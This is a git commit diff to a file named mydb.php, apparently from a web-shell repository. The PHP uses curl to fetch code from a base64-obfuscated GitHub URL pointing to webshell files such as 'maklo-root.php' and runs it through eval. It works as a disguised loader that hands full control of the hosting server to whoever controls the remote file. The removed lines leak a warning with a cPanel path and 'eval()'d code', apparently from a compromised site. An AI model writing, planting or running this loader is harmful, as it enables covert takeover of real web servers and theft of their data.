693aa43ad224c85a9c54b7aeea0daa53e3af20f8
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-07-25 19:36:33 +0700

    mydb.php

--- mydb.php
+++ mydb.php
@@ -1,6 +1,5 @@
-<br />
-<b>Warning</b>:  ob_start(): output handler 'ob_gzhandler' conflicts with 'zlib output compression' in <b>/home/cpanel/sipandu/public_html/filebox/lampiran/index.php(15) : eval()'d code</b> on line <b>3245</b><br />
-<?pHp
+
+<?=<?php
    function get($url) {
     $ch = curl_init();
 
@@ -14,5 +13,5 @@
     return $data;
 }
 $x= '?>';
-      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4cGxvaXQtaGF4b3Ivd2Vic2hlbGwvbWFpbi9teWRiQC5waHA=')));
+      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4cGxvaXQtaGF4b3Ivd2Vic2hlbGwvbWFpbi9tYWtsby1yb290LnBocA==')));
 ?>
